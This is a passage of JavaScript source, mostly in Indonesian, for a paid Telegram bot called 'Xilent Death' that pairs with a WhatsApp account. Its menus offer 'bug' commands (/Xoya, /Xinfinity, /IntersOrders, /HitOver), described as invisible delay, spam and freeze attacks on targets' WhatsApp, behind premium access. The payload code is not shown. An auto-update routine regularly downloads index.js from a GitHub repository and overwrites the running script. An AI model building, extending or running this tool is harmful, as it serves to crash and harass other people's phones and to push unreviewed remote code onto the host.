⠀⠀⢰⢃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠱⡀⠀⠀⠀⢸⠀⠀⠓⠭⡭⠙⠋⠀⠀⠀⠀⠀⠀⠀⡜⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡱⡄⠀⠀
⠀⠀⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢃⠀⠀⠀⢸⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⢀⠜⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠘⣆⠀
⠀⢸⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣆⠀⠀⡆⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⡠⠖⣡⣾⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⠀
⠀⡏⣾⣿⣿⣿⣿⡿⡛⢟⢿⣿⣿⣿⣿⣿⣿⣧⡈⢦⣠⠃⠀⠀⠀⠀⠀⢱⣀⠤⠒⢉⣾⡉⠻⠋⠈⢘⢿⣿⣿⣿⣿⠿⣿⣿⠏⠉⠻⢿⣿⣿⣿⣿⡘⡆
⢰⡇⣿⣿⠟⠁⢸⣠⠂⡄⣃⠜⣿⣿⠿⠿⣿⣿⡿⠦⡎⠀⠀⠀⠀⠀⠒⠉⠉⠑⣴⣿⣿⣎⠁⠠⠂⠮⢔⣿⡿⠉⠁⠀⠹⡛⢀⣀⡠⠀⠙⢿⣿⣿⡇⡇
⠘⡇⠏⠀⠀⠀⡾⠤⡀⠑⠒⠈⠣⣀⣀⡀⠤⠋⢀⡜⣀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠙⢿⡟⠉⡃⠈⢀⠴⣿⣿⣀⡀⠀⠀⠀⠈⡈⠊⠀⠀⠀⠀⠙⢿⡇⡇
⠀⠿⠀⠀⠀⠀⠈⠀⠉⠙⠓⢤⣀⠀⠁⣀⡠⢔⡿⠊⠀⠀⠀⠀⠙⢦⡀⠀⠐⠢⢄⡀⠁⡲⠃⠀⡜⠀⠹⠟⠻⣿⣰⡐⣄⠎⠀⠀⠀⠀⠀⠀⠀⠀⢣⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠙⢦⣀⢀⡴⠁⠀⠀⠀⠀⠉⠁⢱⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠈⢏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⢀⡴⠁⠀⠀⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠘⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⣧⣠⠤⠤⠋⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠳⢄⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠊⠈⠁⠀⠀⠀⡔⠛⠲⣤⣀⣀⣀⠀⠈⢣⡀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⢀⡠⢔⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢈⠤⠒⣀⠀⠀⠀⠀⣀⠟⠀⠀⠀⠑⠢⢄⡀⠀⠀⠈⡗⠂⠀⠀⠀⠙⢦⠤⠒⢊⡡⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠒⣒⡁⠬⠦⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⢺⢠⠤⡀⢀⠤⡀⠠⠷⡊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠣⡀⡱⠧⡀⢰⠓⠤⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠈⠃⠀⠀⠀
───────────────⠀⠀⠀⠀⠀⠀⠀⠀
☇ Bot Connect
☇ WhatsApp Number : ${linkedWhatsAppNumber}
───────────────⠀⠀⠀⠀⠀⠀⠀⠀
`);
       
        if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
          try {

            await bot.telegram.editMessageCaption(
              global.pairingMessage.chatId,
              global.pairingMessage.messageId,
              undefined,
`
\`\`\`js
☾. ⬡══―⊱「 Xilent Death Pairing 」⊰―═⬡ ࣪ ִֶָ☾.
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ    Number : ${linkedWhatsAppNumber}
ϟ    Status : 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙈𝙚𝙣𝙜𝙝𝙪𝙗𝙪𝙣𝙜𝙠𝙖𝙣 ⎙
\`\`\`
`,
              { parse_mode: "Markdown" }
            );

          } catch (err) {
            console.log("❌ Gagal edit pesan:", err.message);
          }

          global.pairingMessage = null;
        }
      }

      if (connection === "close") {
        isWhatsAppConnected = false;
        isStarting = false;

        console.log("❌ Disconnected:", reason);

        if (reason === DisconnectReason.loggedOut || reason === 401) {
          console.log("🚫 Session logout / invalid");

          deleteSession();
          global.pairingMessage = null;
          reconnectAttempts = 0;
          return;
        }

        reconnectAttempts++;

        if (reconnectAttempts > maxReconnect) {
          console.log("⛔ Stop reconnect (limit)");
          return;
        }

        const delay = Math.min(5000 * reconnectAttempts, 30000);

        console.log(`♻️ Reconnect dalam ${delay / 1000}s`);

        setTimeout(() => startSesi(), delay);
      }
    });

  } catch (err) {
    console.log("❌ Error start session:", err);
    isStarting = false;
  }
};
///////////////////////////////////////////////////
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 Sender tidak terhubung, Silahkan /connect terlebih dahulu untuk Menghubungkan sender kembali");
  }
  return next();
};

//////////////////////////////////////
const loadJSON = (file) => {
  try {
    if (!fs.existsSync(file)) return [];

    const data = fs.readFileSync(file, "utf8");
    if (!data) return [];

    return JSON.parse(data);
  } catch (err) {
    console.log("⚠️ JSON corrupt:", file);
    return [];
  }
};
//////////////////////////////////////
const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.log("❌ Failed save JSON:", file, err.message);
  }
};

//////////////////////////////////////
function deleteSession() {
  try {
    if (!sessionPath || !fs.existsSync(sessionPath)) {
      console.log("⚠️ Session not found.");
      return false;
    }

    fs.rmSync(sessionPath, { recursive: true, force: true });
    console.log("🗑️ Session deleted successfully.");
    return true;

  } catch (err) {
    console.log("❌ Failed delete session:", err.message);
    return false;
  }
}
//////////////////////////////////////
module.exports = {
  startSesi,
  checkWhatsAppConnection,
  loadJSON,
  saveJSON,
  deleteSession,
};
//// Variabel ///
let antiCulik = true;
let autoReject = false; 
let pendingGroups = new Map();
let whitelistGroups = []; 
//////////////////////////////////////
let ownerUsers = loadOwner();
let premiumUsers = loadJSON(premiumFile);
let adminList    = [];

loadAdmins();

//////////////////////////////////////

/// ---- OWNER ---- ///
const checkOwner = (ctx, next) => {
  const id = ctx.from.id.toString();

  if (!ownerUsers.includes(id)) {
    return ctx.reply("Owner Access\nContact Pada Yang MeRunning Scriptnya");
  }

  return next();
};
/// ---- ADMIN ---- ///
const checkAdmin = (ctx, next) => {
  const id = ctx.from.id.toString();

  if (
    !adminList.includes(id) &&
    !ownerUsers.includes(id)
  ) {
    return ctx.reply("Admin Access\nContact Pada Yang MeRunning Scriptnya");
  }

  return next();
};
const checkAllPremium = (ctx, next) => {
  const id = ctx.from.id.toString();

  
  if (premiumUsers.includes(id)) {
    return next();
  }

 
  if (ctx.chat.type !== "private" && isGroupPremium(ctx.chat.id)) {
    return next();
  }

  return ctx.reply("❌ Premium Acces\nAnda Perlu Menjadi Premium Acces Jika Ingin Menggunakan Fitur Lebih");
};
/// Anti culik ///
function isSafeGroup(groupId) {
  return whitelistGroups.includes(groupId.toString());
}

function loadSafe() {
  try {
    if (!fs.existsSync(safeFile)) return [];
    return JSON.parse(fs.readFileSync(safeFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function saveSafe(data) {
  fs.writeFileSync(safeFile, JSON.stringify(data, null, 2));
}

//// Group prem ////
function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
//////////
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}
//////////
function isGroupPremium(groupId) {
  return loadPremiumGroups().includes(groupId.toString());
}
/// ---- ADD ADMIN ---- ///
function addAdmin(userId) {
  userId = userId.toString();

  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
}

/// ---- REMOVE ADMIN ---- ///
function removeAdmin(userId) {
  userId = userId.toString();

  adminList = adminList.filter(id => id !== userId);
  saveAdmins();
}

/// ---- SAVE ADMIN ---- ///
function saveAdmins() {
  try {
    fs.writeFileSync("./database/admins.json", JSON.stringify(adminList, null, 2));
  } catch (err) {
    console.log("❌ Gagal save admin:", err.message);
  }
}

/// ---- LOAD ADMIN ---- ///
function loadAdmins() {
  try {
    if (!fs.existsSync("./database/admins.json")) {
      adminList = [];
      return;
    }

    const data = fs.readFileSync("./database/admins.json", "utf8");

   
    adminList = JSON.parse(data || "[]").map(id => id.toString());

  } catch (err) {
    console.log("⚠️ Gagal load admin:", err.message);
    adminList = [];
  }
}
/// ---- SLEEP ---- ///
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/// ---- CHECK PREMIUM ---- ///
function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}

/// ---- CHECK OWNER ---- ///
function isOwner(id) {
  return ownerUsers.includes(id.toString());
}

/// ---- LOAD OWNER ---- ///
function loadOwner() {
  try {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
/// ------ Check Sender ------- \\\
function isSender(userId) {
  return senderUsers.includes(String(userId));
}
// ================= ANTI FOTO =============== //
function loadAntiFoto() {
  try {
    if (!fs.existsSync(antiFotoFile)) return []
    return JSON.parse(fs.readFileSync(antiFotoFile))
  } catch {
    return []
  }
}


function saveAntiFoto(data) {
  fs.writeFileSync(antiFotoFile, JSON.stringify(data, null, 2))
}

let antiFotoGroups = loadAntiFoto()

/// ------- ANTI VIDIO ------- ///
function loadAntiVideo() {
  try {
    if (!fs.existsSync(antiVideoFile)) return []
    return JSON.parse(fs.readFileSync(antiVideoFile))
  } catch {
    return []
  }
}

function saveAntiVideo(data) {
  fs.writeFileSync(antiVideoFile, JSON.stringify(data, null, 2))
}

let antiVideoGroups = loadAntiVideo()
/// ---- GROUP ONLY ---- ///
bot.use((ctx, next) => {
  const groupMode = getGroupMode();

  if (groupMode === "on" && ctx.chat.type === "private") {
    return ctx.reply(`
🔒 𝐆𝐑𝐎𝐔𝐏 𝐎𝐍𝐋𝐘 𝐌𝐎𝐃𝐄

Bot ini hanya bisa digunakan di dalam group.
Silakan gunakan perintah di group.
`);
  }

  return next();
});
/// ---- SELF / PUBLIC MODE ---- ///
bot.use((ctx, next) => {
  const mode = getMode();

  if (mode === "self" && !isOwner(ctx.from.id)) {

    if (ctx.callbackQuery) {
      return ctx.answerCbQuery("🔒 BOT DI KUNCI OWNER", { show_alert: true });
    }

    return; 
  }

  return next();
});
/// ---- COOLDOWN ---- ///
function parseCooldown(input) {
  const match = input.match(/^(\d+)([dhms])$/);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2];

  switch (unit) {
    case "d": // detik
      return value * 1000;

    case "m": // menit
      return value * 60 * 1000;

    case "h": // jam
      return value * 60 * 60 * 1000;

    case "s": // hari
      return value * 24 * 60 * 60 * 1000;

    default:
      return null;
  }
}


let COOLDOWN_TIME = 1;
let COOLDOWN_TEXT = "1d";
const cooldowns = new Map();

function checkCooldown(ctx, next) {
  if (!ctx.from?.id) return next();


  if (isOwner(ctx.from.id)) return next();


  if (COOLDOWN_TIME === 0) return next();

  const userId = String(ctx.from.id);
  const now = Date.now();

  const expireTime = cooldowns.get(userId) || 0;

  if (now < expireTime) {
    
    if (!cooldowns.get(userId + "_msg")) {
      cooldowns.set(userId + "_msg", true);

      setTimeout(() => cooldowns.delete(userId + "_msg"), 3000);

      return ctx.reply(`⏳ Tunggu ${COOLDOWN_TEXT}!`);
    }
    return;
  }

  
  cooldowns.set(userId, now + COOLDOWN_TIME);

  return next();
}

// ================= CATBOX UNTUK TAMPILAN SC =================
const IMAGES = {
  home: "https://e.top4top.io/p_3818jmyvr1.jpg"
};

// ================= RUNTIME =================
function runtime(seconds) {
  seconds = Number(seconds);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor(seconds % 3600 / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

// ================= EDIT MENU =================
async function editMenu(ctx, caption, keyboard) {
  try {
    if (ctx.callbackQuery) {
      await ctx.editMessageMedia(
        {
          type: "photo",
          media: IMAGES.home,
          caption,
          parse_mode: "Markdown"
        },
        {
          reply_markup: { inline_keyboard: keyboard }
        }
      );
    } else {
      await ctx.replyWithPhoto(IMAGES.home, {
        caption,
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard }
      });
    }
  } catch (e) {
    console.log(e);
  }
}

// ================= PAGINATION =================
async function sendPage(ctx, page = 0) {
  const total = pages.length;

  let keyboard = [];

  // 🔥 KHUSUS PAGE BUG (index 2 misal)
  if (page === 2) {
    keyboard = [
      [
        { text: "Invisible Bugs", callback_data: "bug_invis", style: "primary", icon_custom_emoji_id: "4936296803390718929" },
        { text: "Visible Bugs", callback_data: "bug_visible", style: "success", icon_custom_emoji_id: "4956283708580563433" }
      ],
      [
        { text: "Murbug Bugs", callback_data: "bug_murbug", style: "danger", icon_custom_emoji_id: "6204056074111162587" }
      ],
      [
        { text: "Back", callback_data: `page_${page - 1}`, style: "primary", icon_custom_emoji_id: "5355307701050033171" },
        { text: `${page + 1} / ${total}`, callback_data: "noop", style: "danger" },
        { text: "Next", callback_data: `page_${page + 1}`, style: "success", icon_custom_emoji_id: "6178979813064184457" }
      ]
    ];
  } else {
    const nav = [];

    if (page > 0) nav.push({ text: "Back", callback_data: `page_${page - 1}`, style: "primary", icon_custom_emoji_id: "5355307701050033171" });
    nav.push({ text: `${page + 1} / ${total}`, callback_data: "noop", style: "danger" });
    if (page < total - 1) nav.push({ text: "Next", callback_data: `page_${page + 1}`, style: "success", icon_custom_emoji_id: "6178979813064184457" });

    keyboard.push(nav);
  }

  await editMenu(ctx, pages[page], keyboard);
}

// ================= SEMUA PAGE =================
const pages = [

` \`\`\`js
╭───────────────────────╮
  𝙓 𝙄 𝙇 𝙀 𝙉 𝙏 - 𝘿 𝙀 𝘼 𝙏 𝙃 / 3.0
╰───────────────────────╯
ᝰ.ᐟ Developer : @gaponback 
• Version : 3.0 ( Fix ) 
• Info : 70% No Bypass
• System : Auto-Update
• Status : Online ✔
Access  : Premium Verified 
───────────────────
Thank You For Buying.
Create By : @gaponback Official Account 100% Safe

Tap the next button continue →
───────────────────
\`\`\`
`,

` \`\`\`js
╭─〔 ⚙️ XSETTINGS MENU 〕─╮

〔 UPDATE 〕
✘ /update ➤ Update Script
✘ /autoupdate ➤ Auto Update Script

〔 SYSTEM 〕
✘ /connect ➤ Connect Bot
✘ /delpair ➤ Delete Bot 
✘ /runtime ➤ Runtime
✘ /mode ➤ Mode
✘ /cekowner ➤ Owner

〔 SETTING BOT 〕
✘ /setch ➤ Add Ch
✘ /delch ➤ Del All Ch
✘ /lockcmd ➤ Lock Command
✘ /unlockcmd ➤ Unlock Command

〔 PREMIUM 〕
✘ /addprem ➤ Add
✘ /delprem ➤ Del
✘ /addgroupremium ➤ Add G
✘ /delgroupremium ➤ Del G

〔 USER & ADMIN 〕
✘ /list ➤ User List
✘ /addadmin ➤ Add Admin
✘ /deladmin ➤ Del Admin

〔 SECURITY 〕
✘ /anticulik ➤ Anti Culik
✘ /addsafe ➤ Add Safe
✘ /delsafe ➤ Del Safe
✘ /antifoto ➤ Anti Foto
✘ /antivideo ➤ Anti Video

〔 GROUP & SYSTEM 〕
✘ /groupon ➤ ON
✘ /groupoff ➤ OFF
✘ /setcd ➤ Cooldown
✘ /self ➤ Self
✘ /public ➤ Public

tap the next button continue →
───────────────────
\`\`\`
`,

// 🔥 BUG PAGE (INI YG ADA 3 OPSI)
` \`\`\`js
「〔 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗨𝗚 〕」

Target Selection:

➤ Invisible Bug
➥ Tidak Terlihat

➤ Spesial Murbug
➥ Bug Only Murbug

➤ Visible Bug
➥ Terlihat 
\`\`\``,

` \`\`\`js
╭──〔 ⚙️ TOOLS MENU 〕──╮

┌─〔 MEDIA & CONVERT 〕
│ ✘ /brat        ➤ Brat Text Maker
│ ✘ /catbox      ➤ Catbox → Foto
│ ✘ /catboxurl   ➤ Foto → Catbox
│ ✘ /convert     ➤ Convert Media
│ ✘ /hd          ➤ HD Enhancer
└────────────────

┌─〔 DOWNLOADER 〕
│ ✘ /tiktokdl    ➤ Download TikTok
│ ✘ /snack    ➤ Download SnackVideo
└────────────────

┌─〔 UTILITY 〕
│ ✘ /cuaca       ➤ Cek Cuaca
│ ✘ /time        ➤ Waktu Indonesia
│ ✘ /ssiphone    ➤ SS iPhone Theme
│ ✘ /decjs       ➤ Encrypt JS
│ ✘ /harga       ➤ Harga Script
└────────────────

┌─〔 FUN & RANDOM 〕
│ ✘ /cekmasadepan ➤ Ramalan Random
└────────────────

tap the next button continue →
───────────────────
\`\`\`
`,

` \`\`\`js
╭──〔 🌸 BEST SUPPORT 〕──╮
SEMUA DI RAYAKAN 😘
└─────────────────
\`\`\``

];

// ================= BUG CALLBACK =================
bot.action("bug_invis", async (ctx) => {
  await ctx.answerCbQuery();
  await editMenu(ctx, `
\`\`\`js
╭──〔 INVISIBLE BUG MENU 〕──╮

┌─〔 DELAY BUG MENU 〕
│ ✘ /Xoya        ➤ "Delay Invisible Hard"
└────────────────

tap the button continue 
───────────────────
\`\`\`
`, [[{ text: "🔙 Back", callback_data: "page_2", style: "danger" }]]);
});

bot.action("bug_murbug", async (ctx) => {
  await ctx.answerCbQuery();
  await editMenu(ctx, `
\`\`\`js
╭──〔 SPESIAL MURBUG MENU 〕──╮

┌─〔 SPAM BUG 〕
│ ✘ /Xinfinity      ➤ "Bebas Spam Delay"
└────────────────

tap the button continue 
───────────────────
\`\`\`
`, [[{ text: "🔙 Back", callback_data: "page_2", style: "danger" }]]);
});

bot.action("bug_visible", async (ctx) => {
  await ctx.answerCbQuery();
  await editMenu(ctx, `
\`\`\`js
╭──〔 VISIBLE BUG MENU 〕──╮

┌─〔 VISIBLE BUG MENU 〕
│ ✘ /IntersOrders   ➤ "Stuck Home"
│ ✘ /HitOver    ➤ "Delay To Freeze"
└────────────────

tap the button continue 
───────────────────
\`\`\`
`, [[{ text: "🔙 Back", callback_data: "page_2", style: "danger" }]]);
});

// ================= NAVIGATION =================
bot.action(/page_(\d+)/, async (ctx) => {
  await ctx.answerCbQuery();
  sendPage(ctx, parseInt(ctx.match[1]));
});

// ================= START =================
bot.start(async (ctx) => {
  sendPage(ctx, 0);
});

/// CASE BUAT OWNER MENU ///
bot.command("addgroupremium", checkOwner, async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini sudah PREMIUM");
    }

  
    premiumGroups.push(groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dijadikan PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("delgrouppremium", checkOwner, async (ctx) => {
  try {
    
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (!premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini bukan premium");
    }

    
    premiumGroups = premiumGroups.filter(id => id !== groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dihapus dari PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("cekowner", (ctx) => {
  const data = loadJSON(ownerFile);
  ctx.reply(`ID kamu: ${ctx.from.id}\nOwner list: ${data.join(", ")}`);
});


// UPDATE SSCRIPTGAPONNNNNNNNNNNNNNNN :3
const UPDATE_URL = "https://raw.githubusercontent.com/ponzs212/pullupdate/main/index.js";
const PHOTO_URL = "https://e.top4top.io/p_3818jmyvr1.jpg";

bot.command("update", checkOwner, async (ctx) => {
    const msg = await ctx.replyWithPhoto(PHOTO_URL, {
        caption: "🚀 Starting update system..."
    });

    async function edit(percent, status) {
        const bar = "█".repeat(percent / 10) + "░".repeat(10 - percent / 10);

        return ctx.telegram.editMessageCaption(
            ctx.chat.id,
            msg.message_id,
            null,
`🚀 XILENT UPDATE SYSTEM

╭─────〔 UPDATE 〕─────╮
│ ${bar} ${percent}%
│ Status : ${status}
╰────────────────────╯

© Xilent Death Update......`
        );
    }

    try {
        await edit(10, "Connecting GitHub...");
        await new Promise(r => setTimeout(r, 800));

        await edit(30, "Downloading file...");
        const { data } = await axios.get(UPDATE_URL);

        await edit(50, "Backing up...");
        if (fs.existsSync("index.js")) {
            fs.copyFileSync("index.js", "index.backup.js");
        }

        await edit(70, "Replacing file...");
        fs.writeFileSync("index.js", data);

        await edit(90, "Finalizing...");
        await edit(100, "Restarting bot...");

        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            msg.message_id,
            null,
`✅ UPDATE SUCCESS

📦 File updated from GitHub
🔁 Bot restarting...`
        );

        setTimeout(() => process.exit(0), 1500);

    } catch (err) {
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            msg.message_id,
            null,
`❌ UPDATE FAILED

${err.message}`
        );
    }
});

function loadConfig() {
    if (!fs.existsSync("./autoupdate.json")) {
        fs.writeFileSync("./autoupdate.json", JSON.stringify({
            enabled: false,
            lastCommit: null
        }, null, 2));
    }

    return JSON.parse(fs.readFileSync("./autoupdate.json"));
}

function saveConfig(data) {
    fs.writeFileSync("./autoupdate.json", JSON.stringify(data, null, 2));
}

async function checkAutoUpdate() {
    const config = loadConfig();

    if (!config.enabled) return;

    try {
        const { data } = await axios.get(COMMIT_API);

        const latestCommit = data.sha;

        if (latestCommit === config.lastCommit) {
            return;
        }

        console.log("🔄 Update ditemukan");

        config.lastCommit = latestCommit;
        saveConfig(config);

        await updateBot();

    } catch (e) {
        console.log("Auto update error:", e.message);
    }
}

const COMMIT_API =
"https://api.github.com/repos/ponzs212/pullupdate/commits/main";

bot.command("autoupdate", checkOwner, async (ctx) => {
    const args = ctx.message.text.split(" ")[1];

    const config = loadConfig();

    if (args === "on") {
        config.enabled = true;
        saveConfig(config);
        return ctx.reply("✅ Auto Update ON");
    }

    if (args === "off") {
        config.enabled = false;
        saveConfig(config);
        return ctx.reply("❌ Auto Update OFF");
    }

    ctx.reply(`Status: ${config.enabled ? "ON" : "OFF"}`);
});

setInterval(checkAutoUpdate, 5 * 60 * 1000);

//SET CHHHHHHHHHHHH BYYGYYY GAPOKNNNNNN
const DB_FILE = "./channels.json";

function loadChannels() {
    if (!fs.existsSync(DB_FILE)) {
        fs.writeFileSync(DB_FILE, JSON.stringify({
            channels: []
        }, null, 2));
    }

    return JSON.parse(fs.readFileSync(DB_FILE));
}

function saveChannels(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

async function checkChannels(ctx, next) {
    const db = loadChannels();

    if (!db.channels.length) {
        return next();
    }

    const buttons = [];

    for (const link of db.channels) {

        const username = link
            .replace("https://t.me/", "")
            .replace("@", "");

        try {
            const member = await ctx.telegram.getChatMember(
                `@${username}`,
                ctx.from.id
            );

            const joined = [
                "member",
                "administrator",
                "creator"
            ];

            if (!joined.includes(member.status)) {

                buttons.push([
                    Markup.button.url(
                        `Join ${username}`,
                        link
                    )
                ]);
            }

        } catch {}
    }

    if (buttons.length) {

        return ctx.reply(
            "⚠️ Join channel terlebih dahulu untuk menggunakan fitur ini.",
            Markup.inlineKeyboard(buttons)
        );
    }

    return next();
}

bot.command("setch", checkOwner, async (ctx) => {
    const link = ctx.message.text.split(" ")[1];

    if (!link) {
        return ctx.reply("Contoh:\n/setch https://t.me/channelanda\n\nNote : Bot Wajib Di Jadikan Admin Di Ch Tersebut");
    }

    const db = loadChannels();

    if (db.channels.length >= 10) {
        return ctx.reply("❌ Maksimal 10 channel");
    }

    db.channels.push(link);

    saveChannels(db);

    ctx.reply(`✅ Channel ditambahkan\n${link}`);
});

bot.command("delch", checkOwner, async (ctx) => {
    const db = loadChannels();

    db.channels = [];

    saveChannels(db);

    ctx.reply("✅ Semua channel dihapus");
});
// LOCKKKKKKK CMDDDDDD COKKKKKK
const LOCK_FILE = "./lockedcmd.json";

function loadLocks() {
    if (!fs.existsSync(LOCK_FILE)) {
        fs.writeFileSync(LOCK_FILE, JSON.stringify({
            commands: []
        }, null, 2));
    }

    return JSON.parse(fs.readFileSync(LOCK_FILE));
}

function saveLocks(data) {
    fs.writeFileSync(LOCK_FILE, JSON.stringify(data, null, 2));
}

async function checkLocked(ctx, next) {

    const cmd = ctx.message.text
        .split(" ")[0]
        .replace("/", "")
        .toLowerCase();

    const db = loadLocks();

    if (
        db.commands.includes(cmd) &&
        ctx.from.id !== OWNER_ID
    ) {
        return ctx.reply(
            "🔒 Command sedang dikunci oleh owner."
        );
    }

    return next();
}

bot.command("lockcmd", checkOwner, async (ctx) => {

    const cmd = ctx.message.text.split(" ")[1];

    if (!cmd) {
        return ctx.reply(
            "Contoh:\n/lockcmd hitover"
        );
    }

    const db = loadLocks();

    if (!db.commands.includes(cmd)) {
        db.commands.push(cmd);
        saveLocks(db);
    }

    ctx.reply(`🔒 ${cmd} berhasil dikunci`);
});

bot.command("unlockcmd", checkOwner, async (ctx) => {

    const cmd = ctx.message.text.split(" ")[1];

    if (!cmd) {
        return ctx.reply(
            "Contoh:\n/unlockcmd hitover"
        );
    }

    const db = loadLocks();

    db.commands = db.commands.filter(
        x => x !== cmd
    );

    saveLocks(db);

    ctx.reply(`🔓 ${cmd} berhasil dibuka`);
});
// ========== COMMAND /addadmin ) ==========
bot.command("addadmin", checkOwner, async (ctx) => {
  let targetUserId;

  // Cek apakah reply ke pesan user
  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
      "👑 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n" +
      "┇ *✨ CARA PAKAI ADDADMIN* ✨\n" +
      "┇ \n" +
      "┇ 📌 *Contoh:*\n" +
      "┇ `/addadmin 1113570863`\n" +
      "┇ \n" +
      "┇ 📌 *Atau reply pesan user:*\n" +
      "┇ Ketik `/addadmin` sambil reply\n" +
